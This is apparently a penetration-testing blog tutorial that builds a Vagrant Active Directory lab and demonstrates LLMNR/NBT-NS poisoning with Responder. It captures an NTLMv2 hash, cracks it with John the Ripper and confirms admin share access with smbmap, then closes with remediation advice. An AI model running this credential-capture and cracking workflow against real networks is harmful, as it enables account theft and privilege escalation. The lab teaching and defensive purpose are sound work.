---
slug: respond-the-name/
title: Respond the Name
date: 2020-03-31
category: attacks
subtitle: Attacking a network using Responder
tags: security, windows, vulnerability, credential
image: https://res.cloudinary.com/fluid-attacks/image/upload/v1620331057/blog/respond-the-name/cover_uuwp7r.webp
alt: Red wooden mailbox near green leaf plan. Photo by Bundo Kim on Unsplash.
description: Windows hosts use LLMNR and NBT-NS for name resolution on
  the local network. These protocols do not verify addresses,
  and here we detail how to exploit this.
keywords: Windows, LLMNR, NBT-NS, Security, Vulnerability, Hacking, Network,
  Cracking, Ethical Hacking, Pentesting
author: Jonathan Armas
writer: johna
name: Jonathan Armas
about1: Systems Engineer, OSCP - Security+
about2: '"Be formless, shapeless like water" Bruce Lee'
source: https://unsplash.com/photos/S-TcfjrYVKo
---

`Link Local Multicast Name Resolution` (`LLMNR`) and `NetBIOS Name
Service` (`NBT-NS`) are two name resolution protocols that help
`Windows` hosts to find address names from other devices on the network.
These are `Windows` components and are alternate methods of host
identification. `LLMNR` is based upon the `Domain Name System` (`DNS`),
it uses a simple exchange of request and response messages to resolve
computer names on `IPV6` or `IPV4` addresses.

`NBT-NS` uses `NetBIOS` to resolve `IPV4` addresses by broadcasting a
`NetBIOS Name Query Request` message to the local subnet broadcast
address using the port `UDP 137`. The node that owns the queried name
then sends back a unicast message to the requestor. If `NBT-NS` is
disabled then it will need to use `DNS` queries to resolve names, and if
the network does not have `DNS` servers then the names should be in the
`Hosts` file of the machine.

`LLMNR` messages use a similar format to `DNS` messages but use `UDP
port 5355`. It works by sending a `LLMNR Name Query Request` message to
the multicast address, this multicast address is scoped to prevent a
multicast enabler router from forwarding the request outside the
requestor subnet. If a host on the subnet is authoritative for the
request name it sends a unicast response to the requestor.

As both protocols use broadcast messages to resolve names on the
network, an attacker can listen to them and then respond with a spoof of
an authoritative source for name resolution as if he knew the requested
name. Then with the service poisoned, the victim will continue the
communication with the attacker, and if the network resource needs
authentication, the victim will send a username and an `NTLMv2` hash.
Here the attacker can use tools like `JohnTheRipper` to crack the
credentials and have access to the system. This attack is called
`LLMNR/NBT-NS Poisoning and Relay`.

## Responder lab

To set up our lab we are going to use `Hashicorp’s`
[Vagrant](https://www.vagrantup.com/); the source files are below.
Create a folder with the name `requestor` and save the `Vagrantfile`
there. Also create another folder inside `requestor` named `provision`
and save the file `ad.ps1` there.

**setting up the lab.**

``` bash
$ mkdir requestor
$ cd requestor
requestor$ nano Vagrantfile #Add here the content
requestor$ mkdir provision
requestor$ nano provision/ad.ps1 #Add here the content
```

**Vagrantfile.**

``` ruby
# -*- mode: ruby -*-
# vi: set ft=ruby :

Vagrant.configure("2") do |config|

  config.vm.box = "cdaf/WindowsServerDC"
  config.vm.hostname = "winserver"
  config.vm.network "private_network", ip: "192.168.56.2"
  config.vm.provision "shell", path: "provision/ad.ps1"

end
```

**provision/ad.ps1.**

``` powershell
Import-Module ServerManager
Add-WindowsFeature RSAT-AD-PowerShell
import-module activedirectory
New-ADuser -Name "reqtest" -SamAccountName reqtest -Enabled $true -AccountPassword (ConvertTo-SecureString -AsPlainText "SuperSecure@123!!!" -Force)
New-ADuser -Name "svctest" -SamAccountName svctest -Enabled $true -AccountPassword (ConvertTo-SecureString -AsPlainText "Monkey.123" -Force)
setspn -A sky.net/reqtest reqtest
setspn -A sky.net/svctest svctest
Add-ADGroupMember -Identity "Administrators" -Members svctest
Add-ADGroupMember -Identity "Users" -Members reqtest
```

Then run the environment using:

**vagrant up.**

``` bash
requestor$ vagrant up
```

This will create a `Windows` machine with `Active Directory` installed
and configured. At this point, everything we need has been completed and
is ready for us to launch an attack.

Now we can set up our attacking machine. Here we are using [Kali
Linux](https://www.kali.org/) with `Vagrant` too, but you can use
whatever `OS` you prefer.

These are the tools that we are going to use:

- [smbmap](https://github.com/ShawnDEvans/smbmap)

- [Responder](https://github.com/SpiderLabs/Responder)

- [SecLists](https://github.com/danielmiessler/SecLists)

- [JohnTheRipper](https://github.com/magnumripper/JohnTheRipper)

If you are using `Kali`, the only thing that needs to be cloned is
`Responder`.

**cloning Responder.**

``` bash
git clone https://github.com/SpiderLabs/Responder
```

We are ready to go.

## Starting the poisoner

The only thing we need to do is to run `Responder` as a root. We can do
this with the following:

**running Responder.**

``` bash
Responder$ sudo ./Responder.py -I eth1 -wrf
```

**Responder.**

``` bash
NBT-NS, LLMNR & MDNS Responder 2.3

Author: Laurent Gaffie (laurent.gaffie@gmail.com)
To kill this script hit CRTL-C


[+] Poisoners:
LLMNR                      [ON]
NBT-NS                     [ON]
DNS/MDNS                   [ON]

[+] Servers:
HTTP server                [ON]
HTTPS server               [ON]
WPAD proxy                 [ON]
SMB server                 [ON]
Kerberos server            [ON]
SQL server                 [ON]
FTP server                 [ON]
IMAP server                [ON]
POP3 server                [ON]
SMTP server                [ON]
DNS server                 [ON]
LDAP server                [ON]

[+] HTTP Options:
Always serving EXE         [OFF]
Serving EXE                [OFF]
Serving HTML               [OFF]
Upstream Proxy             [OFF]

[+] Poisoning Options:
Analyze Mode               [OFF]
Force WPAD auth            [OFF]
Force Basic Auth           [OFF]
Force LM downgrade         [OFF]
Fingerprint hosts          [ON]

[+] Generic Options:
Responder NIC              [eth1]
Responder IP               [192.168.56.103]
Challenge set              [1122334455667788]



[+] Listening for events...
```

Since we are on the same network, it is only a matter of time to get a
request from a machine in the subnet. But because our `Windows` machine
is doing nothing, we will receive nothing.

## Capturing credentials

Now let’s act like a normal user in our `Windows` machine. Log in as
`svctest` with the domain `sky.net` and password `Monkey.123`, then open
the start menu and there type `run`. In there we are going to look for a
name on the network, just type the following:

**searching names.**

``` bash
\\FLUIDATTACKS
```

There we will get an error accessing the share, but in our attacker
machine we will get the following:

**Responder output.**

``` bash
[*] [LLMNR]  Poisoned answer sent to 192.168.56.2 for name FLUIDATTACKS
[FINGER] OS Version     : Windows Server 2016 Standard Evaluation 14393
[FINGER] Client Version : Windows Server 2016 Standard Evaluation 6.3
[SMB] NTLMv2-SSP Client   : 192.168.56.2
[SMB] NTLMv2-SSP Username : SKY\svctest
[SMB] NTLMv2-SSP Hash     : svctest::SKY:1122334455667788:D78BEB50968B6AEA3D8A9CD04765BB6A:01010000000000008274E5E0A507D60176E66DEAF12162F90000000002000A0053004D0042003100320001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D00420031003200080030003000000000000000000000000030000037AE67261C1D6D0CEBBD9D3AA1803818C033512B8B0FD6DEBA539CFD272D615B0A001000000000000000000000000000000000000900220063006900660073002F0046004C00550049004400410054005400410043004B0053000000000000000000
[SMB] Requested Share     : \\FLUIDATTACKS\IPC$
[*] [LLMNR]  Poisoned answer sent to 192.168.56.2 for name FLUIDATTACKS
[FINGER] OS Version     : Windows Server 2016 Standard Evaluation 14393
[FINGER] Client Version : Windows Server 2016 Standard Evaluation 6.3
[*] Skipping previously captured hash for SKY\svctest
[SMB] Requested Share     : \\FLUIDATTACKS\IPC$
```

<div class="imgblock">

![Responder result](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331056/blog/respond-the-name/vulnerability_lutscw.webp)

<div class="title">

Figure 1. Respoder result

</div>

</div>

Here we have our hash, they are `NTLMv2 hashes`, and there we can also
view some information about the server like the OS version and the
requested share. With this, we save that user’s hash on a file.

**save hash.**

``` bash
echo 'svctest::SKY:1122334455667788:D78BEB50968B6AEA3D8A9CD04765BB6A:01010000000000008274E5E0A507D60176E66DEAF12162F90000000002000A0053004D0042003100320001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D00420031003200080030003000000000000000000000000030000037AE67261C1D6D0CEBBD9D3AA1803818C033512B8B0FD6DEBA539CFD272D615B0A001000000000000000000000000000000000000900220063006900660073002F0046004C00550049004400410054005400410043004B0053000000000000000000' > hashllmnr
```

And then we crack it using `John`, a `SecLists` dictionary, and
`KoreLogic` ruleset. Since `NTLMv2` hashes are harder to crack, it could
take a while, depending on your system.

**John cracking.**

``` bash
john --wordlist=/usr/share/seclists/Passwords/darkweb2017-top100.txt --rules=KoreLogic hashllmnr
```

**John output.**

``` bash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Monkey.123       (svctest)
1g 0:00:00:18 DONE (2020-03-31 17:55) 0.05518g/s 575858p/s 575858c/s 575858C/s Asdfgh.jkl13..Asdfgh.jkl24
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

And it’s cracked\! Now we can check our access running `smbmap` again
with our new set of credentials.

**samba high privileges.**

``` bash
smbmap -u svctest -p 'Monkey.123' -d sky.net -H 192.168.56.2
```

**admin smbmap.**

``` bash
[+] Finding open SMB ports....
[+] User SMB session establishd on 192.168.56.2...
[+] IP: 192.168.56.2:445        Name: 192.168.56.2
        Disk                                                    Permissions
        ----                                                    -----------
        ADMIN$                                                  READ, WRITE
        C$                                                      READ, WRITE
        IPC$                                                    READ ONLY
        NETLOGON                                                READ, WRITE
        SYSVOL                                                  READ, WRITE
        [!] Unable to remove test directory at \\192.168.56.2\SYSVOL\edWFuwvkCb, plreae remove manually
```

As you can see, we now have administrative access to our server. You can
access it by `RDP` or retrieve files using `SMB`. Also, you can dump the
`SAM` to get more users and hashes; these last ones are `NTLMv1` and
easily cracked.

This could be done using the `reqtest` account or the `vagrant` account.
If an attacker does this in an enterprise network, he can capture any
number of accounts of the network. Also, there are windows scripts like
[Inveigh](https://github.com/Kevin-Robertson/Inveigh), where we can do
more or less the same attack with the same results.

### Solution

The remediation for this attack is to disable both `LLMNR` and `NBT-NS`
on all hosts because `Windows` defaults to one when the other fails or
is disabled. A host based security software that blocks `LLMNR/NBT-NS`
requests could also be used.

Another way to mitigate this is by having and using a strong credential
policy. Passwords must be longer than 20 characters, contain upper and
lower case letters, contain symbols and digits, and must not be easy to
guess. This means you would be wise to adopt passphrases instead of
simple passwords.

This is especially useful when you are dealing with service credentials
because they are the ones most targeted. You can also set an alert to
notify you when someone is logged in with your most critical and
high-privileged users.

If you want more information about strong credentials, you can check our
[**Criteria**](https://docs.fluidattacks.com/criteria/) about them.
